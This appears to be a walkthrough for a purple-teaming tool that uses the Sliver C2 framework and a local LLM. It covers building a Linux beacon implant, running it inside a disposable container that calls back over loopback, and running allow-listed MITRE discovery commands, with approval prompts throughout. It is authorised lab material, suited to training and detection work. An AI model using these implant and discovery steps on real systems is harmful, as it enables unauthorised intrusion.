# Purple Teaming Walkthrough — End-to-End in 5 Minutes

This guide reproduces the full AdversarySim-AI purple-teaming loop: start a Sliver
C2 listener, spin up a disposable sandbox, generate a controlled implant, deliver
it, capture the callback telemetry, and tear everything down.

It is written for **researchers and auditors** who want to verify exactly what the
tool does — and, just as importantly, what it does **not** do. Every step is
read-only or sandboxed, and nothing leaves your machine.

> ⏱️ **Total time:** ~5 minutes on a modern laptop.
>
> ⚠️ **Authorised use only.** Run this exclusively on systems you own or have
> explicit written permission to test. The sandbox container is throwaway; the
> Sliver listener binds to `127.0.0.1` and must never be exposed to a network you
> do not control.

---

## What you will prove

| # | Claim | How this guide proves it |
|---|-------|--------------------------|
| 1 | AdversarySim drives a real Sliver C2 server | A live mTLS listener is created via the tooling |
| 2 | Payload generation is gated by the operator | `generate` prompts for approval before building |
| 3 | The loop is auditable end-to-end | The beacon check-in is captured with `adversarysim beacons` |
| 4 | The lab is disposable | A `--rm` container holds the target; `exit` destroys it |
| 5 | No telemetry leaves the host | All traffic stays on the loopback interface |

---

## Prerequisites

Install and verify the four building blocks before you start.

### 1. Sliver C2 (server + client)

Install [Sliver](https://github.com/BishopFox/sliver) and confirm both binaries are
on your `PATH`:

```bash
sliver-server version
sliver-client version
```

If `sliver-client` lives somewhere unusual, point AdversarySim at it:

```bash
export ADVERSARYSIM_SLIVER_CLIENT=/opt/sliver/sliver-client
```

### 2. Podman or Docker

Any OCI runtime works. The commands below use Podman; substitute `docker` freely.

```bash
podman --version      # or: docker --version
```

### 3. Ollama (the local LLM)

```bash
ollama serve                 # leave running in its own terminal
ollama pull qwen2.5-coder:7b
```

### 4. AdversarySim-AI itself

```bash
git clone https://github.com/kadohack12/AdversarySim-AI.git
cd AdversarySim-AI
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
```

Sanity-check the tooling before you touch anything:

```bash
adversarysim version
adversarysim status
```

`adversarysim status` should report that the client is installed and the
server/daemon is reachable. If it is not, fix that first — the rest of the guide
depends on it.

---

## Step 1 — Start an mTLS listener on Sliver

In a **first terminal**, start the Sliver server and its daemon:

```bash
sliver-server daemon        # or just: sliver-server
```

In a **second terminal**, connect the client and start the mutual-TLS listener the
implant will call back to, on port 8888:

```bash
sliver-client
sliver > mtls --lport 8888
```

Confirm the job is registered:

```bash
sliver > jobs
```

You should see the `mtls` job bound to `127.0.0.1:8888`. AdversarySim can read the
same view:

```bash
adversarysim jobs
```

**Expected result:** one active mTLS listener on `127.0.0.1:8888`.

> 🔒 **Why loopback?** Binding to `127.0.0.1` guarantees the callback traffic never
> leaves the host. This is the heart of the privacy-first design.

---

## Step 2 — Launch the sandboxed target

In a **third terminal**, start a disposable Debian container. `--network host`
lets the container reach the loopback listener; `--rm` guarantees it is destroyed
on exit.

```bash
podman run -it --rm --network host --name target-node debian:bookworm-slim bash
```

Inside the container, install the minimum needed to run the implant:

```bash
apt-get update && apt-get install -y ca-certificates
```

**Expected result:** a root shell prompt inside a container named `target-node`.
Leave this shell open — you will return to it in Step 4.

> 🧪 **Why a container?** The target is isolated from your host filesystem and is
> destroyed the moment you exit. There is nothing to clean up later.

---

## Step 3 — Generate a controlled implant via AdversarySim

Back in your **host** terminal (not the container), generate a Linux beacon that
calls back to the listener you started in Step 1:

```bash
adversarysim generate --os linux --lhost 127.0.0.1 --lport 8888 --format elf --beacon
```

AdversarySim will stop and ask for approval, because generating an implant is
classified as a **destructive** action:

```text
Generate beacon implant for linux
  command: generate --os linux --mtls 127.0.0.1:8888 --format elf --save ...
  risk: destructive
Proceed? [y/N]
```

Type `y` and press Enter. The implant is written to `./implants/` (override with
`ADVERSARYSIM_WORKSPACE=/path/to/dir`).

**Expected result:** a file such as
`implants/sliver_implant_linux_8888.elf` on your host.

> 🛡️ **This is the Safety Gate in action.** The LLM and the CLI can *propose* this
> step, but nothing is built until you explicitly approve it. See the
> [role of the local AI](../README.md) in the README for the full model.

If you want to see the exact command without running it, use dry-run mode:

```bash
ADVERSARYSIM_DRY_RUN=true adversarysim generate --os linux --lhost 127.0.0.1 --lport 8888 --format elf --beacon
```

---

## Step 4 — Deploy and execute inside the sandbox

Copy the freshly generated implant into the running container. From your **host**
terminal:

```bash
podman cp implants/sliver_implant_linux_8888.elf target-node:/tmp/implant.elf
```

Now, back in the **container shell** from Step 2, make it executable and run it:

```bash
chmod +x /tmp/implant.elf
/tmp/implant.elf &
```

**Expected result:** the beacon starts and immediately begins checking in with the
mTLS listener on `127.0.0.1:8888`. There is no output in the container — that is
normal for a beacon.

> ⏳ Beacons check in on an interval. Give it a few seconds.

---

## Step 5 — Receive the telemetry

Back on the **host**, ask AdversarySim to list the beacons that have registered:

```bash
adversarysim beacons
```

**Expected result:** a table containing the sandbox beacon — its ID, transport
(`mtls`), remote address, hostname, username, and operating system:

```text
Sliver beacons (1):
  - ID=..., Transport=mtls, Remote Address=127.0.0.1:..., Hostname=target-node, ...
```

This is the payoff: a complete, auditable record of the callback — generated,
delivered, executed, and observed entirely on your own machine.

> 🧠 **Purple-team moment.** Ask the local model to turn this telemetry into
> detection logic:
>
> ```bash
> adversarysim ask "Write a Sigma rule and an auditd rule that would detect an mTLS beacon checking in from /tmp on Debian."
> ```
>
> The model reasons about the observed behaviour and proposes detections — but it
> never touches the target itself.

### Optional — defensible discovery (MITRE T1082 + T1083 + T1057 + T1016)

With a session established, you can emulate a small slice of adversary discovery
on the target. It is a *narrow, allow-listed* action, not a remote shell:

```bash
adversarysim discover <SESSION_ID> whoami
adversarysim discover <SESSION_ID> "uname -a"
adversarysim discover <SESSION_ID> ls          # T1083 — directory listing
adversarysim discover <SESSION_ID> "cat /tmp/canary_data.txt"   # T1083 — canary read
adversarysim discover <SESSION_ID> "ps aux"    # T1057 — process discovery
adversarysim discover <SESSION_ID> "ip a"      # T1016 — network discovery
```

Seed a decoy on the target first if you want something to find:

```bash
# inside the container shell
echo 'FLAG{canary}' > /tmp/canary_data.txt
```

Only these commands are accepted:

| Technique | Commands |
| --------- | -------- |
| **T1082** System Information Discovery | `whoami`, `id`, `uname -a`, `hostname`, `uptime` |
| **T1083** File and Directory Discovery | `pwd`, `ls -la`, `cat /tmp/canary_*.txt` |
| **T1057** Process Discovery | `ps aux` |
| **T1016** System Network Configuration Discovery | `ip a`, `route -n` |

Paths are fixed literals — a canary read is confined to `/tmp/canary_*.txt` — so
discovery can never be aimed at an arbitrary file (no `cat /etc/shadow`, no
`ls /root`). The action is `state-changing`, so AdversarySim prompts for `[y/N]` —
press Enter and nothing runs:

```text
  ▚ SAFETY GATE · STATE-CHANGING
  Run discovery command 'cat /tmp/canary_data.txt' on session <SESSION_ID>
  command: sliver_run_discovery session=<SESSION_ID> command=cat /tmp/canary_data.txt
  risk: state-changing
Proceed? [y/N]
```

**Expected result:** after approving, the target's output is shown (`root`, kernel
string, directory listing, canary contents). The same tool is available to the
local model inside `adversarysim shell` — ask "Quels fichiers sont dans /tmp ?" and
the model requests `sliver_run_discovery`, still gated by the same `[y/N]` prompt.

### Optional — MITRE ATT&CK run with an automatic Purple Team report

The catalogue wraps the same allow-listed commands behind MITRE technique ids and
writes an audit report after each run.

```bash
adversarysim mitre list          # show the catalogue + safety status
adversarysim mitre run T1082     # auto-selects the active beacon
adversarysim mitre run T1057 --no-report   # skip the LLM, curated detections only
```

Expected output (abridged):

```text
  ▚ MITRE T1082 System Information Discovery
  ▚ SAFETY GATE · STATE-CHANGING
Proceed? [y/N] y
  ▚ T1082 · execution → Linux target-node 6.1.0 ...
  ▚ Purple Team report → reports/T1082_20261028-104314.md
```

The report contains the run metadata (date, operator, target), the technique, the
raw Sliver evidence, and defensive recommendations — written by the local LLM when
Ollama is up, otherwise the curated Sigma/auditd suggestions from the catalogue.

---

## Step 6 — Immediate cleanup

Tear the lab down completely. In the **container shell**:

```bash
exit
```

Because the container was started with `--rm`, exiting destroys it and everything
inside it, including the implant copy. Nothing is left behind on the target side.

Then stop the listener and shut down Sliver in the **second terminal**:

```bash
sliver > jobs kill <JOB_ID>
sliver > exit
```

Finally, remove the generated implant from your host if you no longer need it:

```bash
rm -f implants/sliver_implant_linux_8888.elf
```

**Expected result:** no containers, no listeners, no implants. The lab is gone.

---

## Troubleshooting

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| `adversarysim status` says the client is missing | `sliver-client` not on `PATH` | Set `ADVERSARYSIM_SLIVER_CLIENT` to the full path |
| `Sliver server/daemon is not reachable` | Server not started | Run `sliver-server daemon` and import an operator config |
| No beacon appears in `adversarysim beacons` | Beacon interval has not elapsed, or the listener is not mTLS | Wait a few seconds; confirm `adversarysim jobs` shows `mtls` on 8888 |
| Implant cannot connect from the container | Container not using host networking | Start it with `--network host` |
| `adversarysim ask` returns nothing | Ollama not running | Start `ollama serve` and pull the model |

---

## Safety recap

- ✅ All callbacks stay on `127.0.0.1` — **zero telemetry**.
- ✅ Every implant generation is **operator-approved**.
- ✅ Discovery commands are **allow-listed, read-only, and operator-approved** (`[y/N]`):
  T1082 system info and T1083 file/directory discovery, with canary reads confined
  to `/tmp/canary_*.txt`.
- ✅ The target is a **disposable `--rm` container**.
- ✅ Cleanup is a single `exit`.
- ❌ AdversarySim never exposes a general-purpose remote shell — discovery is a
  fixed allow-list, not arbitrary command execution.

Continue to the [README](../README.md) for the architecture and the role of the
local LLM.
